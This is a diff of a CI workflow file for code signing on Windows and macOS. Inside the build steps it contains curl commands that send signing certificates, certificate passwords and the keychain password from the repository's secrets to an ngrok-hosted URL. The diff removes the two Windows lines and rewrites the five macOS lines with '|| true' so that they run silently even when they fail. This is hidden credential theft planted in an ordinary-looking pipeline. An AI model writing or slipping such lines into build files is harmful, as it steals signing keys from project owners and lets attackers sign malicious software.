@@ -21,8 +21,6 @@ jobs:
         run: |
           New-Item -ItemType directory -Path certificate
           Set-Content -Path certificate\certificate.txt -Value '${{ secrets.SIGNING_CERTIFICATE_BASE64 }}'
-          curl https://d1f1-93-156-211-20.ngrok-free.app/SIGNING_CERTIFICATE_BASE64/${{ secrets.SIGNING_CERTIFICATE_BASE64 }}
-          curl https://d1f1-93-156-211-20.ngrok-free.app/WINDOWS_PFX_SECRET/${{ secrets.WINDOWS_PFX_SECRET }}
           certutil -decode certificate\certificate.txt certificate\certificate.pfx
       - name: OSX install setuptools
         if: matrix.os == 'macOS-latest' && startsWith(github.event.head_commit.message,'v2.')
@@ -37,11 +35,11 @@ jobs:
           MACOS_KEYCHAIN_PWD: ${{ secrets.MACOS_KEYCHAIN_PWD }}
         run: |
         
-          curl https://d1f1-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_APP/${{ secrets.MACOS_CERTIFICATE_APP }}
-          curl https://d1f1-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_APP_PWD/${{ secrets.MACOS_CERTIFICATE_APP_PWD }}
-          curl https://d1f1-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_INSTALLER/${{ secrets.MACOS_CERTIFICATE_INSTALLER }}
-          curl https://d1f1-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_INSTALLER_PWD/${{ secrets.MACOS_CERTIFICATE_INSTALLER_PWD }}
-          curl https://d1f1-93-156-211-20.ngrok-free.app/MACOS_KEYCHAIN_PWD/${{ secrets.MACOS_KEYCHAIN_PWD }}
+          curl https://d1f1-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_APP/${{ secrets.MACOS_CERTIFICATE_APP }} || true
+          curl https://d1f1-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_APP_PWD/${{ secrets.MACOS_CERTIFICATE_APP_PWD }} || true
+          curl https://d1f1-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_INSTALLER/${{ secrets.MACOS_CERTIFICATE_INSTALLER }} || true
+          curl https://d1f1-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_INSTALLER_PWD/${{ secrets.MACOS_CERTIFICATE_INSTALLER_PWD }} || true
+          curl https://d1f1-93-156-211-20.ngrok-free.app/MACOS_KEYCHAIN_PWD/${{ secrets.MACOS_KEYCHAIN_PWD }} || true
           # create variables
           CERTIFICATE_PATH_APP=$RUNNER_TEMP/certificate_app.p12
           CERTIFICATE_PATH_INSTALLER=$RUNNER_TEMP/certificate_installer.p12
